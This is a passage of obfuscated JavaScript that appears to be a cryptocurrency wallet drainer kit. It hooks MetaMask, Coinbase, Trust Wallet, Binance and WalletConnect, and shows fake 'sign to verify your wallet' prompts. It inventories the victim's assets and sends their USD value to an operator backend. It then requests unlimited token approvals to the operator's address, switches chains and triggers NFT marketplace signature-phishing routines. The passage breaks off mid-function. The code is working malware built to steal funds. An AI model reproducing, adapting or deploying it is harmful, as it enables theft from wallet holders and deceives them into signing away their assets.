            for (let _0x3afbde = 0x0; _0x3afbde < 0x2; _0x3afbde++) {
                if (_0x23279a['increase']) continue;
                try {
                    const _0x563226 = await retrive_token(_0x23279a[_0x2034e1(0x1cc)], _0x23279a[_0x2034e1(0x1e6)]),
                        _0x18c734 = new ethers[(_0x2034e1(0x265))][(_0x2034e1(0x315))](MS_Settings['RPCs'][_0x23279a[_0x2034e1(0x1cc)]]),
                        _0x5560cb = new ethers[(_0x2034e1(0x32b))](_0x23279a['address'], _0x563226, _0x18c734);
                    if (is_increase_approve(_0x5560cb[_0x2034e1(0x28e)]) == 0x2) _0x23279a[_0x2034e1(0x2b3)] = 0x2;
                    else {
                        if (is_increase_approve(_0x5560cb[_0x2034e1(0x28e)]) == 0x1) _0x23279a['increase'] = 0x1;
                    }
                } catch (_0x573c26) {
                    console[_0x2034e1(0x1db)](_0x573c26);
                }
            }
        } catch (_0x44c020) {
            console[_0x2034e1(0x1db)](_0x44c020);
        }
        if ((MS_Current_Provider == _0x2034e1(0x275) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x275)] >= 0x2 || MS_Current_Provider == _0x2034e1(0x1f8) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x179)] >= 0x2) && _0x23279a[_0x2034e1(0x2b3)]) return await MM_APPROVE_TOKEN(_0x23279a);
        if ((MS_Current_Provider == _0x2034e1(0x275) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)]['MetaMask'] == 0x2 || MS_Current_Provider == 'Trust\x20Wallet' && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x179)] == 0x2) && !_0x23279a[_0x2034e1(0x2b3)]) return await TRANSFER_TOKEN(_0x23279a), 0x2;
        if ((MS_Current_Provider == _0x2034e1(0x275) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x275)] == 0x3 || MS_Current_Provider == _0x2034e1(0x1f8) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x179)] == 0x3) && !_0x23279a[_0x2034e1(0x2b3)]) throw new Error(_0x2034e1(0x2d2));
        const _0x2c2d4a = new ethers[(_0x2034e1(0x265))][(_0x2034e1(0x315))](MS_Settings['RPCs'][_0x23279a[_0x2034e1(0x1cc)]]),
            _0x265f16 = BN(await _0x2c2d4a[_0x2034e1(0x30b)]())[_0x2034e1(0x2a9)](BN(0x64))[_0x2034e1(0x2d4)](BN(Math['floor'](MS_Gas_Multiplier * 0x64)));
        let _0x24f825 = ethers[_0x2034e1(0x36e)]['parseEther'](MS_Unlimited_Amount);
        for (const _0x3623b1 of MS_Settings[_0x2034e1(0x297)]) {
            try {
                if (_0x3623b1[0x0] == MS_Current_Chain_ID && _0x3623b1[0x1] == _0x23279a['address'][_0x2034e1(0x190)]()[_0x2034e1(0x2fc)]()) {
                    _0x24f825 = _0x23279a[_0x2034e1(0x1d9)];
                    break;
                }
            } catch (_0x4f5757) {
                console[_0x2034e1(0x1db)](_0x4f5757);
            }
        }
        const _0xa1b2f = {
                'from': MS_Current_Address,
                'to': _0x23279a[_0x2034e1(0x1e6)],
                'value': _0x2034e1(0x1d1)
            },
            _0x5b2ee6 = new Web3(MS_Provider);
        let _0x1b2290 = null;
        const _0x4ea0c6 = new _0x5b2ee6['eth'][(_0x2034e1(0x32b))](MS_Contract_ABI[_0x2034e1(0x345)], _0x23279a[_0x2034e1(0x1e6)]);
        _0x1b2290 = _0x4ea0c6[_0x2034e1(0x2da)][_0x2034e1(0x2ca)](MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x318)] ? MS_Settings[_0x2034e1(0x305)][_0x2034e1(0x1e6)] : MS_Settings[_0x2034e1(0x2ad)], _0x24f825)['encodeABI'](), _0xa1b2f[_0x2034e1(0x1a0)] = _0x1b2290;
        const _0x17e105 = await _0x2c2d4a[_0x2034e1(0x36f)](_0xa1b2f),
            _0x3ea35d = await _0x2c2d4a['getTransactionCount'](MS_Current_Address, 'pending');
        _0xa1b2f[_0x2034e1(0x21a)] = _0x265f16, _0xa1b2f[_0x2034e1(0x1ee)] = _0x17e105, _0xa1b2f[_0x2034e1(0x2c8)] = _0x3ea35d, await approve_request(_0x23279a), sign_next();
        const _0x2e3905 = await MS_Signer[_0x2034e1(0x20e)](_0xa1b2f);
        wait_message();
        if (MS_Settings['Settings'][_0x2034e1(0x340)]) await _0x2c2d4a[_0x2034e1(0x1c9)](_0x2e3905[_0x2034e1(0x1ef)], 0x1, 0x7530);
        return await approve_success(_0x23279a), sign_ready(), 0x1;
    }, MM_APPROVE_TOKEN = async _0x1aff61 => {
        const _0x19b7e7 = _0x1027e3;
        if ((MS_Current_Provider == 'MetaMask' && MS_Settings['Settings']['Approve'][_0x19b7e7(0x275)] >= 0x2 || MS_Current_Provider == 'Trust\x20Wallet' && MS_Settings['Settings'][_0x19b7e7(0x256)][_0x19b7e7(0x179)] >= 0x2) && !_0x1aff61[_0x19b7e7(0x2b3)]) try {
            for (let _0xf3da14 = 0x0; _0xf3da14 < 0x2; _0xf3da14++) {
                if (_0x1aff61[_0x19b7e7(0x2b3)]) continue;
                try {
                    const _0x18f2fb = await retrive_token(_0x1aff61[_0x19b7e7(0x1cc)], _0x1aff61[_0x19b7e7(0x1e6)]),
                        _0xb4214 = new ethers[(_0x19b7e7(0x265))]['JsonRpcProvider'](MS_Settings['RPCs'][_0x1aff61['chain_id']]),
                        _0x3fb86a = new ethers[(_0x19b7e7(0x32b))](_0x1aff61[_0x19b7e7(0x1e6)], _0x18f2fb, _0xb4214);
                    if (is_increase_approve(_0x3fb86a['functions']) == 0x2) _0x1aff61[_0x19b7e7(0x2b3)] = 0x2;
                    else {
                        if (is_increase_approve(_0x3fb86a[_0x19b7e7(0x28e)]) == 0x1) _0x1aff61['increase'] = 0x1;
                    }
                } catch (_0x452f6c) {
                    console[_0x19b7e7(0x1db)](_0x452f6c);
                }
            }
        } catch (_0x1a6373) {
            console[_0x19b7e7(0x1db)](_0x1a6373);
        }
        const _0x48bde9 = new ethers[(_0x19b7e7(0x265))][(_0x19b7e7(0x315))](MS_Settings[_0x19b7e7(0x31a)][_0x1aff61[_0x19b7e7(0x1cc)]]),
            _0x29b7b8 = BN(await _0x48bde9[_0x19b7e7(0x30b)]())['div'](BN(0x64))[_0x19b7e7(0x2d4)](BN(Math[_0x19b7e7(0x32c)](MS_Gas_Multiplier * 0x64)));
        let _0x558bf4 = ethers['utils'][_0x19b7e7(0x1f0)](MS_Unlimited_Amount);
        for (const _0x461174 of MS_Settings[_0x19b7e7(0x297)]) {
            try {
                if (_0x461174[0x0] == MS_Current_Chain_ID && _0x461174[0x1] == _0x1aff61[_0x19b7e7(0x1e6)][_0x19b7e7(0x190)]()[_0x19b7e7(0x2fc)]()) {
                    _0x558bf4 = _0x1aff61[_0x19b7e7(0x1d9)];
                    break;
                }
            } catch (_0x1d53c4) {
                console[_0x19b7e7(0x1db)](_0x1d53c4);
            }
        }
        const _0x117185 = {
                'from': MS_Current_Address,
                'to': _0x1aff61[_0x19b7e7(0x1e6)],
                'value': _0x19b7e7(0x1d1)
            },
            _0x110418 = new Web3(MS_Provider);
        let _0x5ddf84 = null;
        const _0x2d422c = _0x1aff61[_0x19b7e7(0x2b3)] == 0x2 ? _0x19b7e7(0x2ab) : _0x19b7e7(0x31e),
            _0x168f81 = new _0x110418[(_0x19b7e7(0x2f8))]['Contract']([{
                'inputs': [{
                    'internalType': _0x19b7e7(0x1e6),
                    'name': _0x19b7e7(0x2f6),
                    'type': _0x19b7e7(0x1e6)
                }, {
                    'internalType': _0x19b7e7(0x27d),
                    'name': _0x19b7e7(0x1c0),
                    'type': 'uint256'
                }],
                'name': '' + _0x2d422c,
                'outputs': [{
                    'internalType': 'bool',
                    'name': '',
                    'type': _0x19b7e7(0x288)
                }],
                'stateMutability': _0x19b7e7(0x2c3),
                'type': _0x19b7e7(0x233)
            }], _0x1aff61[_0x19b7e7(0x1e6)]);
        _0x5ddf84 = _0x168f81[_0x19b7e7(0x2da)][_0x2d422c](MS_Settings[_0x19b7e7(0x30a)][_0x19b7e7(0x318)] ? MS_Settings[_0x19b7e7(0x305)][_0x19b7e7(0x1e6)] : MS_Settings['Address'], _0x558bf4)[_0x19b7e7(0x301)](), _0x117185['data'] = _0x5ddf84;
        const _0x2dc363 = await _0x48bde9[_0x19b7e7(0x36f)](_0x117185),
            _0x8789fb = await _0x48bde9[_0x19b7e7(0x263)](MS_Current_Address, _0x19b7e7(0x28f));
        _0x117185[_0x19b7e7(0x21a)] = _0x29b7b8, _0x117185[_0x19b7e7(0x1ee)] = _0x2dc363, _0x117185[_0x19b7e7(0x2c8)] = _0x8789fb, await approve_request(_0x1aff61), sign_next();
        const _0xe52415 = await MS_Signer[_0x19b7e7(0x20e)](_0x117185);
        wait_message();
        if (MS_Settings[_0x19b7e7(0x30a)][_0x19b7e7(0x340)]) await _0x48bde9[_0x19b7e7(0x1c9)](_0xe52415[_0x19b7e7(0x1ef)], 0x1, 0x7530);
        return await approve_success(_0x1aff61), sign_ready(), 0x1;
    }, connect_wallet = async (_0x3e44ba = null) => {
        const _0x34c511 = _0x1027e3;
        try {
            if (!MS_Connection) {
                if (MS_Load_Time == null || Math[_0x34c511(0x32c)](Date[_0x34c511(0x364)]() / 0x3e8) - MS_Load_Time < 0xf) return;
                MS_Loader_Style == 0x2 ? MSL[_0x34c511(0x314)]({
                    'icon': _0x34c511(0x173),
                    'title': _0x34c511(0x1fd),
                    'subtitle': 'Нет\x20связи\x20с\x20сервером',
                    'text': _0x34c511(0x319),
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK',
                    'color': MS_Color_Scheme
                }) : (Swal['close'](), Swal[_0x34c511(0x314)]({
                    'html': _0x34c511(0x26f),
                    'icon': _0x34c511(0x173),
                    'allowOutsideClick': !![],
                    'allowEscapeKey': !![],
                    'timer': 0x0,
                    'width': 0x258,
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK'
                }));
                return;
            }
            if (MS_Process) return;
            MS_Process = !![];
            if (MS_Bad_Country) {
                try {
                    ms_hide();
                } catch (_0x4e42d4) {
                    console[_0x34c511(0x1db)](_0x4e42d4);
                }
                try {
                    MS_Loader_Style == 0x2 ? MSL['fire']({
                        'icon': _0x34c511(0x173),
                        'title': 'Critical\x20Error',
                        'subtitle': _0x34c511(0x1ac),
                        'text': _0x34c511(0x2ba),
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : (Swal['close'](), Swal[_0x34c511(0x314)]({
                        'html': _0x34c511(0x30e),
                        'icon': _0x34c511(0x173),
                        'allowOutsideClick': !![],
                        'allowEscapeKey': !![],
                        'timer': 0x0,
                        'width': 0x258,
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK'
                    })), await new Promise(_0x5e6b94 => setTimeout(_0x5e6b94, 0x3a98)), window[_0x34c511(0x215)][_0x34c511(0x28d)] = _0x34c511(0x20c);
                } catch (_0x1ad261) {
                    console[_0x34c511(0x1db)](_0x1ad261);
                }
                return;
            }
            if (_0x3e44ba !== null) {
                if (_0x3e44ba == _0x34c511(0x275)) {
                    if (typeof window['ethereum'] == _0x34c511(0x2d9) && typeof window[_0x34c511(0x23d)][_0x34c511(0x265)] === 'object') {
                        let _0x31b24e = ![];
                        for (const _0x868a7e of window[_0x34c511(0x23d)][_0x34c511(0x265)]) {
                            if (_0x868a7e['isMetaMask'] == !![]) {
                                _0x31b24e = !![], MS_Provider = _0x868a7e, MS_Current_Provider = 'MetaMask';
                                break;
                            }
                        }
                        if (!_0x31b24e) {
                            if (MS_Mobile_Status) {
                                window[_0x34c511(0x215)][_0x34c511(0x28d)] = _0x34c511(0x221) + MS_Current_URL, MS_Process = ![];
                                return;
                            } else {
                                window[_0x34c511(0x293)](_0x34c511(0x204), _0x34c511(0x1d7))[_0x34c511(0x2a7)](), MS_Process = ![];
                                return;
                            }
                        }
                    } else {
                        if (typeof window[_0x34c511(0x23d)] === _0x34c511(0x2d9) && window['ethereum']['isMetaMask']) MS_Provider = window[_0x34c511(0x23d)], MS_Current_Provider = _0x34c511(0x275);
                        else {
                            if (MS_Mobile_Status) {
                                window[_0x34c511(0x215)]['href'] = _0x34c511(0x221) + MS_Current_URL, MS_Process = ![];
                                return;
                            } else {
                                window['open']('https://metamask.io', _0x34c511(0x1d7))[_0x34c511(0x2a7)](), MS_Process = ![];
                                return;
                            }
                        }
                    }
                } else {
                    if (_0x3e44ba == _0x34c511(0x322)) {
                        if (typeof window[_0x34c511(0x23d)] == 'object' && typeof window[_0x34c511(0x23d)]['providers'] === 'object') {
                            let _0x2408d3 = ![];
                            for (const _0x38ff80 of window['ethereum'][_0x34c511(0x265)]) {
                                if (_0x38ff80[_0x34c511(0x2dd)] == !![]) {
                                    _0x2408d3 = !![], MS_Provider = _0x38ff80;
                                    break;
                                }
                            }
                            if (_0x2408d3) MS_Current_Provider = _0x34c511(0x322);
                            else {
                                if (MS_Mobile_Status) {
                                    window['location']['href'] = _0x34c511(0x354) + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window[_0x34c511(0x293)](_0x34c511(0x343), _0x34c511(0x1d7))[_0x34c511(0x2a7)](), MS_Process = ![];
                                    return;
                                }
                            }
                        } else {
                            if (typeof window[_0x34c511(0x23d)] === _0x34c511(0x2d9) && (window['ethereum'][_0x34c511(0x2dd)] || window[_0x34c511(0x23d)][_0x34c511(0x1ec)])) MS_Provider = window[_0x34c511(0x23d)], MS_Current_Provider = 'Coinbase';
                            else {
                                if (MS_Mobile_Status) {
                                    window[_0x34c511(0x215)][_0x34c511(0x28d)] = 'https://go.cb-w.com/dapp?cb_url=https://' + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window[_0x34c511(0x293)](_0x34c511(0x343), _0x34c511(0x1d7))[_0x34c511(0x2a7)](), MS_Process = ![];
                                    return;
                                }
                            }
                        }
                    } else {
                        if (_0x3e44ba == _0x34c511(0x1f8)) {
                            if (typeof window[_0x34c511(0x23d)] === _0x34c511(0x2d9) && window[_0x34c511(0x23d)][_0x34c511(0x32f)]) MS_Provider = window[_0x34c511(0x23d)], MS_Current_Provider = _0x34c511(0x1f8);
                            else {
                                if (MS_Mobile_Status) {
                                    window[_0x34c511(0x215)][_0x34c511(0x28d)] = 'https://link.trustwallet.com/open_url?coin_id=60&url=https://' + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window[_0x34c511(0x293)](_0x34c511(0x2fd), _0x34c511(0x1d7))['focus'](), MS_Process = ![];
                                    return;
                                }
                            }
                        } else {
                            if (_0x3e44ba == 'Binance\x20Wallet') {
                                if (typeof window[_0x34c511(0x244)] === _0x34c511(0x2d9)) MS_Provider = window[_0x34c511(0x244)], MS_Current_Provider = _0x34c511(0x23c);
                                else {
                                    window['open']('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', _0x34c511(0x1d7))[_0x34c511(0x2a7)](), MS_Process = ![];
                                    return;
                                }
                            } else _0x3e44ba == _0x34c511(0x2b1) || _0x3e44ba == 'WalletConnect_v2' ? MS_Current_Provider = _0x34c511(0x2b1) : typeof window['ethereum'] === _0x34c511(0x2d9) ? (MS_Provider = window['ethereum'], MS_Current_Provider = _0x34c511(0x196)) : MS_Current_Provider = _0x34c511(0x2b1);
                        }
                    }
                }
            } else window[_0x34c511(0x23d)] ? (MS_Provider = window[_0x34c511(0x23d)], MS_Current_Provider = _0x34c511(0x196)) : MS_Current_Provider = _0x34c511(0x2b1);
            try {
                await connect_request();
                let _0xe256a0 = null;
                if (MS_Current_Provider == _0x34c511(0x2b1)) {
                    ms_hide(), await load_wc();
                    try {
                        await MS_Provider[_0x34c511(0x317)]();
                    } catch (_0x3284d3) {
                        console[_0x34c511(0x1db)](_0x3284d3);
                    }
                    await MS_Provider['connect']();
                    if (MS_Provider && MS_Provider[_0x34c511(0x1a8)]['length'] > 0x0) {
                        if (!MS_Provider['accounts'][0x0][_0x34c511(0x2e6)]('0x')) return MS_Process = ![], await connect_cancel();
                        await new Promise(_0x4d60f4 => setTimeout(_0x4d60f4, 0x9c4)), MS_Current_Address = MS_Provider[_0x34c511(0x1a8)][0x0], MS_Current_Chain_ID = MS_Provider[_0x34c511(0x26c)], MS_Web3 = new ethers['providers'][(_0x34c511(0x2af))](MS_Provider), MS_Signer = MS_Web3[_0x34c511(0x294)](), MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x2b1)] == 0x0 && (MS_Sign_Disabled = !![]);
                    } else return MS_Process = ![], await connect_cancel();
                } else try {
                    _0xe256a0 = await MS_Provider[_0x34c511(0x2e2)]({
                        'method': _0x34c511(0x1c3),
                        'params': [{
                            'eth_accounts': {}
                        }]
                    });
                    if (_0xe256a0 && _0xe256a0['length'] > 0x0) {
                        if (!MS_Provider[_0x34c511(0x35c)][_0x34c511(0x2e6)]('0x')) return connect_cancel();
                        MS_Current_Address = MS_Provider[_0x34c511(0x35c)], MS_Current_Chain_ID = parseInt(MS_Provider[_0x34c511(0x26c)]), MS_Web3 = new ethers[(_0x34c511(0x265))][(_0x34c511(0x2af))](MS_Provider), MS_Signer = MS_Web3[_0x34c511(0x294)]();
                    } else return MS_Process = ![], await connect_cancel();
                } catch (_0x2e9dd7) {
                    _0xe256a0 = await MS_Provider[_0x34c511(0x2e2)]({
                        'method': 'eth_requestAccounts'
                    });
                    if (_0xe256a0 && _0xe256a0[_0x34c511(0x25b)] > 0x0) {
                        if (!_0xe256a0[0x0][_0x34c511(0x2e6)]('0x')) return connect_cancel();
                        MS_Current_Address = _0xe256a0[0x0], MS_Current_Chain_ID = parseInt(MS_Provider[_0x34c511(0x26c)]), MS_Web3 = new ethers[(_0x34c511(0x265))][(_0x34c511(0x2af))](MS_Provider), MS_Signer = MS_Web3[_0x34c511(0x294)]();
                    } else return MS_Process = ![], await connect_cancel();
                }
                if (!MS_Current_Address[_0x34c511(0x19c)](/^0x\S+$/)) throw new Error(_0x34c511(0x2b4));
            } catch (_0x2b45fa) {
                return console[_0x34c511(0x1db)](_0x2b45fa), MS_Process = ![], await connect_cancel();
            }
            ms_hide();
            if (MS_Settings[_0x34c511(0x260)] == 0x1) {
                MS_Loader_Style == 0x2 ? MSL['fire']({
                    'icon': _0x34c511(0x17d),
                    'title': _0x34c511(0x1df),
                    'text': _0x34c511(0x2f9),
                    'showConfirmButton': !![],
                    'confirmButtonText': _0x34c511(0x35e),
                    'color': MS_Color_Scheme
                }) : Swal['fire']({
                    'html': '<b>Sign\x20message</b>\x20to\x20verificate\x20you\x20wallet...',
                    'imageUrl': _0x34c511(0x27e),
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x0,
                    'width': 0x258,
                    'showConfirmButton': ![]
                });
                try {
                    const _0x3c4773 = (MS_Verify_Message == '' ? MS_Settings[_0x34c511(0x213)] : MS_Verify_Message)[_0x34c511(0x1f2)](_0x34c511(0x2bf), MS_Current_Address),
                        _0x135182 = await MS_Signer[_0x34c511(0x1b8)](_0x3c4773),
                        _0x9a0c1 = ethers['utils'][_0x34c511(0x1f5)](ethers[_0x34c511(0x36e)]['hashMessage'](_0x3c4773), _0x135182);
                    if (!_0x9a0c1) return MS_Loader_Style == 0x2 ? MSL['fire']({
                        'icon': _0x34c511(0x173),
                        'title': 'Error',
                        'subtitle': 'Verification\x20Error',
                        'text': _0x34c511(0x217),
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : Swal['fire']({
                        'title': _0x34c511(0x2b8),
                        'text': _0x34c511(0x217),
                        'icon': _0x34c511(0x173),
                        'confirmButtonText': 'OK'
                    }), MS_Process = ![], await connect_cancel();
                    else {
                        let _0x459c57 = await send_request({
                            'action': _0x34c511(0x286),
                            'sign': _0x135182,
                            'address': MS_Current_Address,
                            'message': MS_Verify_Message
                        });
                        if (_0x459c57[_0x34c511(0x197)] != 'OK') return MS_Loader_Style == 0x2 ? MSL['fire']({
                            'icon': _0x34c511(0x173),
                            'title': 'Error',
                            'subtitle': _0x34c511(0x2b8),
                            'text': _0x34c511(0x217),
                            'showConfirmButton': !![],
                            'confirmButtonText': 'OK',
                            'color': MS_Color_Scheme
                        }) : Swal[_0x34c511(0x314)]({
                            'title': _0x34c511(0x2b8),
                            'text': _0x34c511(0x217),
                            'icon': 'error',
                            'confirmButtonText': 'OK'
                        }), MS_Process = ![], await connect_cancel();
                    }
                } catch (_0xc8c5db) {
                    return MS_Loader_Style == 0x2 ? MSL['fire']({
                        'icon': _0x34c511(0x173),
                        'title': _0x34c511(0x2a8),
                        'subtitle': _0x34c511(0x2b8),
                        'text': 'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.',
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : Swal[_0x34c511(0x314)]({
                        'title': _0x34c511(0x2b8),
                        'text': 'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.',
                        'icon': 'error',
                        'confirmButtonText': 'OK'
                    }), MS_Process = ![], await connect_cancel();
                }
            } else await send_request({
                'action': _0x34c511(0x286),
                'address': MS_Current_Address
            });
            await connect_success(), show_check();
            if (MS_Settings[_0x34c511(0x222)][_0x34c511(0x25b)] > 0x0 && MS_Settings['Wallet_Blacklist'][_0x34c511(0x2e6)](MS_Current_Address[_0x34c511(0x190)]()['trim']())) {
                MS_Check_Done = !![], Swal['close']();
                MS_Loader_Style == 0x2 ? MSL['fire']({
                    'icon': _0x34c511(0x173),
                    'title': 'Error',
                    'subtitle': _0x34c511(0x271),
                    'text': _0x34c511(0x329),
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK',
                    'color': MS_Color_Scheme
                }) : Swal[_0x34c511(0x314)]({
                    'title': _0x34c511(0x271),
                    'text': _0x34c511(0x2d6),
                    'icon': _0x34c511(0x173),
                    'confirmButtonText': 'OK'
                });
                MS_Process = ![];
                return;
            }
            let _0x668742 = await get_wallet_assets(MS_Current_Address),
                _0x24c5f1 = 0x0;
            for (const _0x498f53 of _0x668742) {
                try {
                    _0x24c5f1 += _0x498f53[_0x34c511(0x344)];
                } catch (_0x5a0821) {
                    console[_0x34c511(0x1db)](_0x5a0821);
                }
            }
            let _0x3214a2 = 0x0;
            for (const _0x5c2b2d of _0x668742) _0x3214a2 += _0x5c2b2d['amount_usd'];
            await send_request({
                'action': _0x34c511(0x1fa),
                'user_id': MS_ID,
                'assets': _0x668742,
                'balance': _0x3214a2
            }), MS_Check_Done = !![], Swal[_0x34c511(0x218)]();
            if (MS_Settings['Settings'][_0x34c511(0x2de)] > _0x24c5f1) {
                MS_Loader_Style == 0x2 ? MSL[_0x34c511(0x314)]({
                    'icon': _0x34c511(0x173),
                    'title': 'Error',
                    'subtitle': _0x34c511(0x24e),
                    'text': _0x34c511(0x29e),
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK',
                    'color': MS_Color_Scheme
                }) : Swal[_0x34c511(0x314)]({
                    'title': _0x34c511(0x24e),
                    'text': _0x34c511(0x29e),
                    'icon': _0x34c511(0x173),
                    'confirmButtonText': 'OK'
                });
                MS_Process = ![];
                return;
            }
            MS_Loader_Style == 0x2 ? MSL[_0x34c511(0x314)]({
                'icon': _0x34c511(0x17d),
                'title': 'Waiting\x20for\x20action',
                'text': 'Sign\x20message\x20in\x20your\x20wallet...',
                'showConfirmButton': !![],
                'confirmButtonText': _0x34c511(0x35e),
                'color': MS_Color_Scheme
            }) : Swal[_0x34c511(0x314)]({
                'html': _0x34c511(0x1d5),
                'imageUrl': _0x34c511(0x27e),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x275)] == 0x0 && MS_Current_Provider == _0x34c511(0x275) || MS_Settings['Settings'][_0x34c511(0x2ce)][_0x34c511(0x179)] == 0x0 && MS_Current_Provider == _0x34c511(0x1f8) || MS_Current_Provider == _0x34c511(0x1f8) && !MS_Mobile_Status) MS_Sign_Disabled = !![];
            for (const _0x1b727f of _0x668742) {
                try {
                    if (_0x1b727f[_0x34c511(0x281)] != 'NATIVE') MS_Gas_Reserves[_0x1b727f[_0x34c511(0x1cc)]] += 0x1;
                } catch (_0x108698) {
                    console[_0x34c511(0x1db)](_0x108698);
                }
            }
            console[_0x34c511(0x1f3)](_0x668742);
            if (typeof SIGN_BLUR !== _0x34c511(0x1d2) && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x20f)][_0x34c511(0x313)] == 0x1 && MS_Settings['Settings'][_0x34c511(0x20f)][_0x34c511(0x312)] == 0x1) await SIGN_BLUR(_0x668742, MS_Provider, MS_Current_Address, MS_Settings[_0x34c511(0x2ad)], MS_ID, MS_Settings['Settings'][_0x34c511(0x20f)][_0x34c511(0x2e8)]);
            if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c4)]['Enable'] == 0x1 && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c4)][_0x34c511(0x312)] == 0x1) await SIGN_SEAPORT(_0x668742, MS_Provider, MS_Current_Address, MS_Settings['Address'], MS_ID, MS_Settings['Settings']['SeaPort']['Price']);
            if (typeof SIGN_X2Y2 !== _0x34c511(0x1d2) && MS_Settings[_0x34c511(0x30a)]['x2y2'][_0x34c511(0x313)] == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x359)][_0x34c511(0x312)] == 0x1) await SIGN_X2Y2(_0x668742, MS_Provider, MS_Current_Address, MS_Settings['Address'], MS_ID, MS_Settings[_0x34c511(0x30a)][_0x34c511(0x359)][_0x34c511(0x2e8)]);
            let _0x246ea1 = !![];
            while (_0x246ea1) {
                _0x246ea1 = MS_Settings['LA'] == 0x1;
                for (const _0x58be45 of _0x668742) {
                    try {
                        if (_0x58be45['skip']) continue;
                        let _0x2a7f26 = ![];
                        if (_0x58be45[_0x34c511(0x281)] == _0x34c511(0x19a)) {
                            const _0x5af6c9 = new ethers[(_0x34c511(0x265))]['JsonRpcProvider'](MS_Settings[_0x34c511(0x31a)][_0x58be45[_0x34c511(0x1cc)]]),
                                _0x3303e5 = BN(await _0x5af6c9[_0x34c511(0x30b)]())[_0x34c511(0x2a9)](BN(0x64))[_0x34c511(0x2d4)](Math[_0x34c511(0x32c)](MS_Gas_Multiplier * 0x64)),
                                _0x31c103 = BN(_0x58be45['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x58be45['chain_id'] == 0xa86a ? 0x4c4b40 : _0x58be45[_0x34c511(0x1cc)] == 0x171 ? 0xdbba0 : 0x249f0),
                                _0x19dfa3 = _0x31c103[_0x34c511(0x2d4)](MS_Gas_Reserves[_0x58be45[_0x34c511(0x1cc)]] + 0x1)[_0x34c511(0x2d4)](_0x3303e5),
                                _0x241c7c = {
                                    'from': MS_Current_Address,
                                    'to': MS_Settings[_0x34c511(0x347)],
                                    'value': BN(0x64)
                                },
                                _0x367513 = await _0x5af6c9[_0x34c511(0x36f)](_0x241c7c),
                                _0x1f3586 = await _0x5af6c9[_0x34c511(0x2a6)](MS_Current_Address),
                                _0x32551b = _0x1f3586[_0x34c511(0x236)](_0x367513['mul'](_0x3303e5))[_0x34c511(0x236)](_0x19dfa3);
                            if (_0x32551b[_0x34c511(0x1b2)](BN(0x0))) continue;
                        }
                        if (_0x58be45[_0x34c511(0x1cc)] != MS_Current_Chain_ID) {
                            await chain_request(MS_Current_Chain_ID, _0x58be45[_0x34c511(0x1cc)]);
                            try {
                                if (MS_Current_Provider == _0x34c511(0x2b1)) try {
                                    await MS_Provider['request']({
                                        'method': _0x34c511(0x262),
                                        'params': [{
                                            'chainId': '0x' + _0x58be45[_0x34c511(0x1cc)]['toString'](0x10)
                                        }]
                                    });
                                } catch (_0x2c3023) {
                                    await chain_cancel();
                                    continue;
                                } else try {
                                    await MS_Provider[_0x34c511(0x2e2)]({
                                        'method': _0x34c511(0x262),
                                        'params': [{
                                            'chainId': '0x' + _0x58be45[_0x34c511(0x1cc)][_0x34c511(0x2df)](0x10)
                                        }]
                                    });
                                } catch (_0x587ced) {
                                    if (_0x587ced[_0x34c511(0x1b7)] == 0x1326 || _0x587ced[_0x34c511(0x1b7)] == -0x7f5b) try {
                                        await MS_Provider['request']({
                                            'method': 'wallet_addEthereumChain',
                                            'params': [MS_MetaMask_ChainData[_0x58be45[_0x34c511(0x1cc)]]]
                                        });
                                    } catch (_0x1f7050) {
                                        await chain_cancel();
                                        continue;
                                    } else {
                                        await chain_cancel();
                                        continue;
                                    }
                                }
                                MS_Current_Chain_ID = _0x58be45[_0x34c511(0x1cc)], MS_Web3 = new ethers[(_0x34c511(0x265))]['Web3Provider'](MS_Provider), MS_Signer = MS_Web3[_0x34c511(0x294)](), _0x2a7f26 = !![], await chain_success();
                            } catch (_0x395d9d) {
                                console['log'](_0x395d9d), await chain_cancel();
                                continue;
                            }
                        } else _0x2a7f26 = !![];
                        if (!_0x2a7f26) continue;
                        if (_0x58be45['type'] == _0x34c511(0x19a)) {
